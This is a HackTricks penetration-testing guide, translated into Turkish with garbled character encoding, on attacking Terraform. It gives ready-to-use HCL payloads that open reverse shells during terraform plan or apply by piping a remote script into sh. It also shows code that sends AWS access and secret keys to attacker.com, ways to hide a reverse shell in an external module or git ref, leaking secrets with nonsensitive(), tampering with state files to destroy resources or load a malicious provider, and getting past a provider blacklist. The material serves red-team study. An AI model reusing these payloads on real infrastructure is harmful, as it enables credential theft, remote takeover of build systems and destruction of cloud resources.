# Terraform GÃ¼venliÄŸi

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na (https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

[Belgelerden:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, insan tarafÄ±ndan okunabilir yapÄ±landÄ±rma dosyalarÄ±nda **bulut ve yerinde kaynaklarÄ± tanÄ±mlamanÄ±za** olanak tanÄ±yan bir **altyapÄ± kodu aracÄ±dÄ±r**. Bu dosyalarÄ± sÃ¼rÃ¼mleyebilir, yeniden kullanabilir ve paylaÅŸabilirsiniz. ArdÄ±ndan, tÃ¼m altyapÄ±nÄ±zÄ±n yaÅŸam dÃ¶ngÃ¼sÃ¼ boyunca bir tutarlÄ± iÅŸ akÄ±ÅŸÄ±nÄ± kullanarak altyapÄ±nÄ±zÄ± saÄŸlamlaÅŸtÄ±rabilir ve yÃ¶netebilirsiniz. Terraform, hesaplama, depolama ve aÄŸ kaynaklarÄ± gibi dÃ¼ÅŸÃ¼k seviyeli bileÅŸenleri yÃ¶netebilirken, DNS giriÅŸleri ve SaaS Ã¶zellikleri gibi yÃ¼ksek seviyeli bileÅŸenleri de yÃ¶netebilir.

### Terraform nasÄ±l Ã§alÄ±ÅŸÄ±r?

Terraform, bulut platformlarÄ±nda ve diÄŸer hizmetlerde kaynaklarÄ± oluÅŸturur ve yÃ¶netirken uygulama programlama arayÃ¼zleri (API'ler) aracÄ±lÄ±ÄŸÄ±yla Ã§alÄ±ÅŸÄ±r. SaÄŸlananlar, Terraform'un eriÅŸilebilir bir API ile neredeyse herhangi bir platform veya hizmetle Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlar.

![](<../.gitbook/assets/image (177).png>)

HashiCorp ve Terraform topluluÄŸu **1700'den fazla saÄŸlayÄ±cÄ±** yazmÄ±ÅŸtÄ±r ve binlerce farklÄ± tÃ¼rde kaynaÄŸÄ± ve hizmeti yÃ¶netmek iÃ§in bu sayÄ± devam etmektedir. Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birÃ§ok saÄŸlayÄ±cÄ±yÄ± iÃ§eren tÃ¼m genel olarak kullanÄ±labilir saÄŸlayÄ±cÄ±larÄ± [Terraform Registry](https://registry.terraform.io/) Ã¼zerinde bulabilirsiniz.

Temel Terraform iÅŸ akÄ±ÅŸÄ± Ã¼Ã§ aÅŸamadan oluÅŸur:

* **Yazma:** KaynaklarÄ± tanÄ±mlarsÄ±nÄ±z, bu kaynaklar birden fazla bulut saÄŸlayÄ±cÄ± ve hizmette olabilir. Ã–rneÄŸin, bir uygulamayÄ± sanal makinelerde bir Sanal Ã–zel AÄŸ (VPC) aÄŸÄ±ndaki gÃ¼venlik gruplarÄ± ve bir yÃ¼k dengeleyici ile daÄŸÄ±tmak iÃ§in bir yapÄ±landÄ±rma oluÅŸturabilirsiniz.
* **Planlama:** Terraform, mevcut altyapÄ± ve yapÄ±landÄ±rmanÄ±za dayanarak oluÅŸturacaÄŸÄ±, gÃ¼ncelleyeceÄŸi veya sileceÄŸi altyapÄ±yÄ± tanÄ±mlayan bir yÃ¼rÃ¼tme planÄ± oluÅŸturur.
* **Uygulama:** OnaylandÄ±ÄŸÄ±nda, Terraform Ã¶nerilen iÅŸlemleri doÄŸru sÄ±rayla gerÃ§ekleÅŸtirir ve herhangi bir kaynak baÄŸÄ±mlÄ±lÄ±ÄŸÄ±nÄ± dikkate alÄ±r. Ã–rneÄŸin, bir VPC'nin Ã¶zelliklerini gÃ¼ncellerseniz ve bu VPC'deki sanal makinelerin sayÄ±sÄ±nÄ± deÄŸiÅŸtirirseniz, Terraform Ã¶nce VPC'yi yeniden oluÅŸturacak ve ardÄ±ndan sanal makineleri Ã¶lÃ§eklendirecektir.

![](<../.gitbook/assets/image (215).png>)

## Terraform LaboratuvarÄ±

Sadece bilgisayarÄ±nÄ±za terraform yÃ¼kleyin.

Ä°ÅŸte bir [kÄ±lavuz](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve iÅŸte [terraform'Ä± indirmenin en iyi yolu](https://www.terraform.io/downloads).

## Terraform'da Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

Terraform'Ä±n **bir web sayfasÄ± veya aÄŸ hizmeti sunan bir platformu yoktur**, bu nedenle terraform'Ä± **kompromize etmenin tek yolu** **terraform yapÄ±landÄ±rma dosyalarÄ±nÄ± ekleyebilmek/deÄŸiÅŸtirebilmektir**.

Ancak, terraform, **farklÄ± konumlara ayrÄ±calÄ±klÄ± eriÅŸim** saÄŸlayacak ÅŸekilde Ã§alÄ±ÅŸabilmesi iÃ§in **Ã§ok hassas bir bileÅŸendir**.

Bir saldÄ±rganÄ±n terraform'Ä±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± sistemdeki sistemi kompromize edebilmesi iÃ§in temel yol, terraform yapÄ±landÄ±rmalarÄ±nÄ± depolayan depoyu **kompromize etmesidir**, Ã§Ã¼nkÃ¼ bir noktada bunlar **yorumlanacaklardÄ±r**.

AslÄ±nda, bir PR oluÅŸturulduktan sonra **otomatik olarak terraform plan/apply** iÅŸlemini gerÃ§ekleÅŸtiren Ã§Ã¶zÃ¼mler vardÄ±r, Ã¶rneÄŸin **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Bir terraform dosyasÄ±nÄ± ele geÃ§irebilirseniz, birisi `terraform plan` veya `terraform apply` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nda farklÄ± yollarla RCE gerÃ§ekleÅŸtirebilirsiniz.

### Terraform plan

Terraform plan, terraform'da **en Ã§ok kullanÄ±lan komuttur** ve geliÅŸtiriciler/terraform kullanan Ã§Ã¶zÃ¼mler sÃ¼rekli olarak bunu Ã§aÄŸÄ±rÄ±r, bu nedenle **RCE almanÄ±n en kolay yolu**, bir `terraform plan` sÄ±rasÄ±nda keyfi komutlarÄ± Ã§alÄ±ÅŸtÄ±racak ÅŸekilde zehirlemiÅŸ bir terraform yapÄ±landÄ±rma dosyasÄ± oluÅŸturmaktÄ±r.

#### Harici bir saÄŸlayÄ±cÄ± kullanarak

Terraform, Terraform ve harici programlar arasÄ±nda bir arayÃ¼z saÄŸlayan [`external` saÄŸlayÄ±cÄ±yÄ±](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. `external` veri kaynaÄŸÄ±nÄ± kullanarak bir `plan` sÄ±rasÄ±nda keyfi kod Ã§alÄ±ÅŸtÄ±rabilirsiniz.

Bir terraform yapÄ±landÄ±rma dosyasÄ±na aÅŸaÄŸÄ±dakine benzer bir ÅŸey enjekte etmek, `terraform plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda bir ters shell Ã§alÄ±ÅŸtÄ±racaktÄ±r:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Ã–zel bir saÄŸlayÄ±cÄ± kullanma

Bir saldÄ±rgan, [Ã¶zel bir saÄŸlayÄ±cÄ±yÄ±](https://learn.hashicorp.com/tutorials/terraform/provider-setup) [Terraform Registry](https://registry.terraform.io/)'e gÃ¶nderebilir ve daha sonra bunu bir Ã¶zellik dalÄ±nda Terraform koduna ekleyebilir ([buradan Ã¶rnek](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
SaÄŸlayÄ±cÄ± `init`te indirilir ve `plan` Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kÃ¶tÃ¼ amaÃ§lÄ± kodu Ã§alÄ±ÅŸtÄ±racaktÄ±r.

Ã–rneÄŸi [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

#### Harici bir referans kullanma

Bahsedilen her iki seÃ§enek de faydalÄ±dÄ±r ancak Ã§ok gizli deÄŸildir (ikincisi birinci seÃ§eneÄŸe gÃ¶re daha gizli ancak daha karmaÅŸÄ±ktÄ±r). Bu saldÄ±rÄ±yÄ± hatta daha **gizli bir ÅŸekilde** gerÃ§ekleÅŸtirebilirsiniz, aÅŸaÄŸÄ±daki Ã¶nerileri takip ederek:

* Terraform dosyasÄ±na doÄŸrudan ters kabuk eklemek yerine, ters kabuÄŸu iÃ§eren **harici bir kaynaÄŸÄ± yÃ¼kleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) adresinde bulabilirsiniz.

* DÄ±ÅŸ kaynaÄŸÄ± kullanÄ±rken, **ref** Ã¶zelliÄŸini kullanarak **repo iÃ§inde bir dalda terraform rev shell kodunu gizlemek** iÃ§in ÅŸÃ¶yle bir ÅŸey yapabilirsiniz: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

TÃ¼m deÄŸiÅŸiklikleri uygulamak iÃ§in Terraform apply komutu Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r, ayrÄ±ca **yerel yÃ¼rÃ¼tme** ile RCE elde etmek iÃ§in kÃ¶tÃ¼ niyetli bir Terraform dosyasÄ± enjekte edebilirsiniz.\
Sadece aÅŸaÄŸÄ±daki gibi bir payload'Ä±n `main.tf` dosyasÄ±nda yer aldÄ±ÄŸÄ±ndan emin olmanÄ±z yeterlidir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
## SÄ±rlarÄ±n SÄ±zdÄ±rÄ±lmasÄ±

`terraform apply` komutunu Ã§alÄ±ÅŸtÄ±rarak **terraform tarafÄ±ndan kullanÄ±lan gizli deÄŸerlerin sÄ±zdÄ±rÄ±lmasÄ±nÄ±** saÄŸlamak iÃ§in terraform dosyasÄ±na ÅŸÃ¶yle bir ÅŸey ekleyebilirsiniz:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform Durum DosyalarÄ±nÄ±n KÃ¶tÃ¼ye KullanÄ±lmasÄ±

EÄŸer terraform durum dosyalarÄ± Ã¼zerinde yazma eriÅŸiminiz varsa ancak terraform kodunu deÄŸiÅŸtiremiyorsanÄ±z, [**bu araÅŸtÄ±rma**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) dosyadan faydalanmanÄ±n bazÄ± ilginÃ§ seÃ§eneklerini sunar:

### KaynaklarÄ± Silme <a href="#deleting-resources" id="deleting-resources"></a>

KaynaklarÄ± yok etmek iÃ§in 2 yol vardÄ±r:

1. **GerÃ§ek kaynaÄŸa iÅŸaret eden rastgele bir isimle bir kaynak durum dosyasÄ±na ekleyin**

Ã‡Ã¼nkÃ¼ terraform, kaynaÄŸÄ±n var olmamasÄ± gerektiÄŸini gÃ¶recek ve onu yok edecektir (belirtilen gerÃ§ek kaynak kimliÄŸini takip ederek). Ã–nceki sayfadaki Ã¶rnek:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **KaynaÄŸÄ± silmek iÃ§in deÄŸiÅŸtirin, gÃ¼ncellenemeyecek ÅŸekilde (bÃ¶ylece silinecek ve yeniden oluÅŸturulacak)**

Bir EC2 Ã¶rneÄŸi iÃ§in, Ã¶rneÄŸin tÃ¼rÃ¼nÃ¼ deÄŸiÅŸtirmek, terraform'un silip yeniden oluÅŸturmasÄ±nÄ± saÄŸlamak iÃ§in yeterlidir.

### Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

AyrÄ±ca, [Ã¶zel bir saÄŸlayÄ±cÄ± oluÅŸturmak](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) ve terraform durum dosyasÄ±ndaki saÄŸlayÄ±cÄ±lardan birini kÃ¶tÃ¼ niyetli olanla deÄŸiÅŸtirmek veya kÃ¶tÃ¼ niyetli saÄŸlayÄ±cÄ±yla boÅŸ bir kaynak eklemek de mÃ¼mkÃ¼ndÃ¼r. Ã–zgÃ¼n araÅŸtÄ±rmadan bir Ã¶rnek:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Kara listeye alÄ±nmÄ±ÅŸ saÄŸlayÄ±cÄ±yÄ± deÄŸiÅŸtirin

EÄŸer `hashicorp/external` durumunda kara listeye alÄ±ndÄ±ÄŸÄ±nÄ±z bir durumla karÅŸÄ±laÅŸÄ±rsanÄ±z, aÅŸaÄŸÄ±dakileri yaparak `external` saÄŸlayÄ±cÄ±sÄ±nÄ± yeniden uygulayabilirsiniz. Not: https://registry.terraform.io/providers/nazarewk/external/latest adresinde yayÄ±nlanan dÄ±ÅŸ saÄŸlayÄ±cÄ± Ã§atalÄ±nÄ± kullanÄ±yoruz. Kendi Ã§atalÄ±nÄ±zÄ± yayÄ±nlayabilir veya yeniden uygulayabilirsiniz.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ArdÄ±ndan `external`'Ä± normal ÅŸekilde kullanabilirsiniz.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Denetim AraÃ§larÄ±

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzu statik analiz ederek potansiyel yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± tespit etmek iÃ§in kullanÄ±r.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan, AltyapÄ± olarak Kod iÃ§in bir statik kod analizcisi.

## Referanslar

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya beni Twitter'da takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.**

</details>
